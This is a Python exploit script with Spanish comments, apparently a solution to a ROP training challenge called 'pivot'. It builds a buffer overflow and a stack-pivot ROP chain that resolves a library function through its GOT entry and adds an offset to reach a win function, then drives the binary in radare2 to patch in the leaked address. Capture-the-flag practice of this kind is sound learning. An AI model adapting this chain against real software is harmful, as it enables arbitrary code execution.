#!/usr/bin/env python2
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import p64
import r2pipe
import IPython

ovf = "A"*40

addr_foothold = p64(0x00400850)
foothold_plt = p64(0x00602048)
pop_rax = p64(0x00400b00)

ret_Rax = p64(0x00400b05)
pop_rbp = p64(0x00400948)
add_rbp_to_rax = p64(0x00400b09)
call_rax = p64(0x0040098e)

xch_rax_rbp = p64(0x00400b02)
# [0x602048] + 0x14e

payload_2 = addr_foothold       # Hacemos la llamada a foothold para que se resuelva
payload_2 += pop_rax            # Primer ROP gadget para guardar un valor en RAX
payload_2 += foothold_plt       #   direccion que tiene la direccion de foothold

payload_2 += ret_Rax            # Ponemos el rax el valor al que apunta rax
                                # Hay que buscar cómo añadirle 0x14e a rax
payload_2 += pop_rbp            # Dejamos un valor en rbp
payload_2 += p64(0x14e)         #   Este valor
payload_2 += add_rbp_to_rax     # A partir de aquí rax tendrá el valor del ret2win de la lib
payload_2 += call_rax           # Hacemos call

payload_1 = ovf                 # Overflow normal
payload_1 += pop_rax            # Cargamos en eax un valor
payload_1 += "\x90"*8           # Hueco para escribir la dirección que se nos dé por stdout
payload_1 += xch_rax_rbp        # Movemos el rbp al valor que tenemos en rax

with open('stdin.bin', 'wb+') as f:
    f.write(payload_2 + "\n" + payload_1)

# python -c 'print("BBBB\n" + "A"*40 + "\x00"*8)' > stdin.bin
# r2 -R stdin='stdin.bin' -c 'dcu 0x00400a0e; k addr=`dr rax`; dcu 0x00400ae1;' -Ad ./pivot
r2 = r2pipe.open(filename='./pivot', flags=['-R', 'stdio="/dev/pts/1" stdin="stdin.bin"', '-d'])
r2.cmd('dcu 0x00400a0e')

addr = r2.cmd('dr rax')
print('Found addr: ' + addr)
r2.cmd('dcu 0x00400ae1')

# wB <addr> @ rsp+8
r2.cmd('wv8 ' + addr + ' @ rsp+8')
r2.cmd('dc')

#IPython.embed()
r2.quit()

# r2 -R stdin='stdin.bin' -c 'dcu 0x00400a0e; k addr=`dr rax`; dcu 0x00400ae1; wv8 `k addr` @r:rsp+0x8; Vpp' -d ./pivot

